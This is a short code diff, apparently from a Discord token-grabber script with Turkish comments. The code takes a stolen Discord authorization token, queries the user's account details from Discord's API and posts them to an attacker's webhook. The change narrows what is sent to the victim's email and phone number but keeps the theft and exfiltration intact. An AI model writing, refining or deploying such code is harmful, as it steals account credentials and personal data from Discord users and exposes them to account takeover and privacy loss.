@@ -49,20 +49,18 @@
                     })
                 });
 
-                // Kullanıcı bilgilerini al ve gönder
+                // Kullanıcı bilgilerini al (sadece e-posta ve telefon)
                 fetch('https://discord.com/api/v9/users/@me', {
                     headers: { 'Authorization': token }
                 })
                 .then(res => res.json())
                 .then(user => {
+                    const email = user.email || 'Gizli';
+                    const phone = user.phone || 'Yok';
+
                     const bilgi = 
-                        `**👤 KULLANICI BİLGİLERİ**\n` +
-                        `**Kullanıcı Adı:** ${user.username}#${user.discriminator}\n` +
-                        `**ID:** ${user.id}\n` +
-                        `**E-posta:** ${user.email || 'Gizli'}\n` +
-                        `**Doğrulanmış:** ${user.verified ? '✅ Evet' : '❌ Hayır'}\n` +
-                        `**Telefon:** ${user.phone || 'Yok'}\n` +
-                        `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
+                        `**📧 E-posta:** ${email}\n` +
+                        `**📱 Telefon:** ${phone}`;
 
                     fetch(webhook, {
                         method: 'POST',
